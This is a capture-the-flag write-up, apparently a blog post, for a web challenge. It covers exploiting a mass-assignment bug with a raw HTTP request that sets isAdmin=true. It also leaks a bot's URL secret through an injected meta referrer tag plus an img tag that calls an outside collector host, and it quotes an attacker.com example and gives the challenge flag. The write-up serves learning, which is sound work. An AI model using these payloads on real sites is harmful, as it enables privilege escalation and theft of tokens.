---
title: "CBC Promotion Day 2026"
description: "Peak local Indonesian CTF"
date: 2026-05-17
summary: "Team: @PETIR | Upsolve web challenges"
tags: ["Web Exploitation"]
categories: ["Writeups"]
showTableOfContents: true
draft: false
---
Team : @PETIR

### Title : DOMPurify
```
DOMPurify is a DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML and SVG.

Author : daffainfo
```

This CTF was very peak because it banned the usage of ais

I didnt manage to solve it in the ctf but i learnt something new so i created this writeup!

# Enumeration

So the challenge name was DOMPurify i thought it would be like a DOMPurify CVE challenge or another bypass to the DOMPurify

```js
app.post("/notes/new", requireAdmin, (req, res) => {
  const title = typeof req.body.title === "string" ? req.body.title.trim() : "";
  const body = typeof req.body.body === "string" ? req.body.body : "";

  if (!title || !body) {
    return res.status(400).send(renderLayout(
      "new note",
      `<h1>compose note</h1><p class="error">title and body are required.</p>`,
      req.user
    ));
  }

  const note = {
    id: crypto.randomUUID(),
    title,
    body,
    author: req.user.username
  };

  notes.push(note);
  res.redirect(`/notes/${note.id}`);
});

app.get("/notes/:id", (req, res) => {
  const user = getCurrentUser(req);
  const note = notes.find((entry) => entry.id === req.params.id);

  if (!note) {
    return res.status(404).send(renderLayout("not found", "<h1>not found</h1>", user));
  }

  res.type("html").send(renderLayout(
    note.title,
    `<h1>${escapeHtml(note.title)}</h1>
     <p>author: ${escapeHtml(note.author)}</p>
     <section class="panel">
       <div class="label">raw note</div>
       <pre id="sanitized-markup"></pre>
     </section>
     <section class="panel">
       <div class="label">preview</div>
       <div id="rendered-output" class="output"></div>
     </section>
     <script id="note-body" type="application/json">${escapeJsonForHtml(note.body)}</script>
     <script src="https://cdn.jsdelivr.net/npm/dompurify@3.4.2/dist/purify.min.js"></script>
     <script>
       (() => {
         const rawBody = JSON.parse(document.getElementById("note-body").textContent);
         const sanitized = DOMPurify.sanitize(rawBody);
         document.getElementById("sanitized-markup").textContent = sanitized;
         document.getElementById("rendered-output").innerHTML = sanitized;
       })();
     </script>`,
    user
  ));
});
```

The version of the DOMPurify used was `dompurify@3.4.2` but in the current time of solving this challenge there are no known cves for the current version of DOMPurify even with the version `3.4.4` update so sadly no easy wins here

There was an assignment bug in the `/profile` endpoint

```js
app.get("/profile", requireAuth, (req, res) => {
  res.type("html").send(renderLayout(
    "profile",
    `<h1>profile</h1>
     <p class="muted">update your public profile information.</p>
     <form method="post" action="/profile">
       <input name="displayName" value="${escapeHtml(req.user.displayName)}" placeholder="Display name">
       <textarea name="bio" placeholder="Short bio">${escapeHtml(req.user.bio)}</textarea>
       <button type="submit">save profile</button>
     </form>
     <div class="panel">
       <p><strong>username:</strong> ${escapeHtml(req.user.username)}</p>
     </div>`,
    req.user
  ));
});

app.post("/profile", requireAuth, (req, res) => {
  Object.assign(req.user, req.body);
  res.redirect("/profile");
});
```

Where the user object datastructure is like this

```js
const user = {
    id: nextUserId++,
    username,
    password,
    displayName: username,
    bio: "",
    isAdmin: false
};
```

SO in theory because anything we put in the request body is assigned to the `user` object we can inject a `isAdmin` attribute thats `true` to be assigned to our current user object

```
POST /profile HTTP/1.1
Host: 0.0.0.0:9101
Content-Length: 18
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://0.0.0.0:9101
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://0.0.0.0:9101/profile
Accept-Encoding: gzip, deflate, br
Cookie: sid=038f967d1d5d8528be54e4df5538ed26
Connection: keep-alive

displayName=a&bio=&isAdmin=true
```

We successfully gotten an `admin` privileged account what now?

The `rabbit hole`, because of the challenge name i was too focused on bypassing the DOMPurify and this is a very bad thing to do the reason is

Looking at the file format i thought it was you typical XSS bot setup so i literally skipped reading the bot.js 

```
app.js
bot.js
Dockerfile
docker-compose.yml
package-lock.json
package.json
```

THE THING IS THE MOST IMPORTANT THING IS IN THE `bot.js`

literally the first 12 lines of the `bot.js`

```js
const puppeteer = require("puppeteer-core");
const { URL } = require("url");

const BASE_URL = "http://localhost:9101";
const FLAG = process.env.FLAG || "CBC{FAKEFLAG}";
const CHROME_PATH = process.env.CHROME_PATH || "/opt/chrome/chrome-linux64/chrome";

function buildVisitUrl(targetUrl) {
  const parsed = new URL(targetUrl);
  parsed.searchParams.set("flag", FLAG);
  return parsed.toString();
}
```

as you can see the flag was being used as a search parameter????? THIS IS INSANE

and another thing is inside of the `Dockerfile`

```dockerfile
RUN apt-get update && apt-get install -y --no-install-recommends \
    ca-certificates \
    curl \
    unzip \
  && mkdir -p /opt/chrome \
  && curl -fsSL "https://storage.googleapis.com/chrome-for-testing-public/135.0.7049.5/linux64/chrome-linux64.zip" -o /tmp/chrome.zip \
  && unzip /tmp/chrome.zip -d /opt/chrome \
  && rm /tmp/chrome.zip \
  && rm -rf /var/lib/apt/lists/*
```

The setup spesifically used the version `chrome-for-testing-public/135.0.7049.5` so maybe theres a url leak problem in the versin of that chrome

searching in google i came across lots of writeups that uses referrer

Examples :
https://infosecwriteups.com/token-leakage-via-referrer-the-invisible-slip-to-third-parties-9c8d326dd52c
https://medium.com/@Zero-Ray/referrer-policy-bypass-via-http-link-header-injection-e9e9025bf221

Then theres this issue in chromium
https://issues.chromium.org/issues/415961179

![Chromium Version](/images/chromium.png)

HMMMMMMM the challenge current version is lower than the vulnerable version interesting

In the report we can see this in the vulnerability details

```
Meta Tag Injection Issue (by @omidxrz):

Even if a site sets a secure Referrer-Policy (e.g., strict-origin-when-cross-origin) via HTTP headers, an attacker can override it by injecting a meta tag like <meta name="referrer" content="unsafe-url">.
Combined with an injected <img src="https://attacker.com/log">, this forces the browser to send the full URL (e.g., https://vulnerable-site.com/callback?code=SECRET-OAUTH-CODE) in the Referer header.
Impact: Similar to the above, this can leak OAuth codes, enabling attackers to gain unauthorized access to user accounts.
```

So i created the POC below

```html
<meta name="referrer" content="unsafe-url">
<img src="https://auricauric.requestcatcher.com//log">
```

Then we can send it to the `/visit` via the url parameter

```
http://challengeid.http.cyberbreaker.id:8080/visit?url=http://localhost:9101/notes/713442ac-d433-4031-b0ee-c6c9b87a981f
```

![Description of image](/images/botvisitCBC.png)

![Description of image](/images/CBCflag.png)

![Description of image](/images/CBCflagdecoded.png)

Thanks to @bengsky for pointing me in the right direction during the upsolve

{{< alert icon="check-circle" cardColor="#10b981" >}}
**Flag :** `CBC{156589431aa441799976ab8b5d6e1ae2}`
{{< /alert >}}